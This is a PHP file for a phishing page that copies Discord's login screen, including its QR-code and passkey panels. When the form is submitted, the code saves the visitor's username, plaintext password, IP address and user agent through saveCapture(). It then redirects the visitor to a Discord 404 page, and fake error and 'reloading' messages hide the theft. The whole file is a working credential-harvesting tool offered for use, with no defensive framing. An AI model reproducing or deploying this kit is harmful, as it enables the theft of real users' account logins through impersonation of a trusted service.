<?php
require_once '../../config.php';

// Handle POST login submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = '';
    foreach (['email', 'username', 'user', 'login', 'uname', 'userid'] as $field) {
        if (!empty($_POST[$field])) { $username = $_POST[$field]; break; }
    }

    $password = '';
    foreach (['password', 'pass', 'passwd', 'pwd', 'passcode'] as $field) {
        if (!empty($_POST[$field])) { $password = $_POST[$field]; break; }
    }

    $template = 'discord';
    $ip = getClientIP();
    $agent = sanitize($_SERVER['HTTP_USER_AGENT'] ?? 'Unknown');

    saveCapture([
        'username'   => sanitize($username),
        'password'   => $password,
        'ip_address' => $ip,
        'user_agent' => $agent,
        'template'   => $template
    ]);

    header('Location: https://discord.com/404');
    exit;
}

// GET request - display login page
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord</title>
    <link rel="icon" href="fav.ico">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="discord-logo">
        <img src="discord-logo.svg" alt="Discord" width="32" height="32">
        Discord
    </div>

    <div class="login-card">
        <div class="form-section">
            <h2 class="welcome">Welcome back!</h2>
            <p class="subtext">We're so excited to see you again!</p>

            <form action="login.php" method="POST" id="login-form" novalidate>
                <label for="email">Email or Phone Number <span class="required">*</span></label>
                <input type="text" id="email" name="email" required autocomplete="email">
                <div class="field-error" id="email-error">
                    <svg viewBox="0 0 24 24" width="14" height="14" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
                    <span>This field is required</span>
                </div>

                <label for="password">Password <span class="required">*</span></label>
                <input type="password" id="password" name="password" required autocomplete="current-password">

                <a href="#" class="forgot-link" id="forgot-link">Forgot your password?</a>

                <button type="submit" class="login-btn" id="login-btn">Log In</button>

                <p class="register-line">Need an account? <a href="https://discord.com/register" class="register-link" id="register-link">Register</a></p>
            </form>
        </div>

        <div class="qr-section">
            <div class="qr-box">
                <canvas id="qr-canvas" width="180" height="180"></canvas>
                <img src="qr.png" class="qr-overlay" alt="">
            </div>
            <h3 class="qr-title">Log in with QR Code</h3>
            <p class="qr-desc">Scan this with the <strong>Discord mobile app</strong> to log in instantly.</p>
            <a href="#" class="passkey-link" id="passkey-link">Or, sign in with passkey</a>
            <div class="passkey-loader" id="passkey-loader">
                <div class="loader-spinner"></div>
                <span>Authenticating...</span>
            </div>
            <div class="passkey-error" id="passkey-error">Something went wrong. Try another option.</div>
        </div>
    </div>

    <div class="fp-modal" id="fp-modal">
        <div class="fp-modal-card">
            <div class="fp-modal-loader"></div>
            <p class="fp-modal-text">Something went wrong.<br>Reloading the page...</p>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>
<?php
// End of login.php
?>
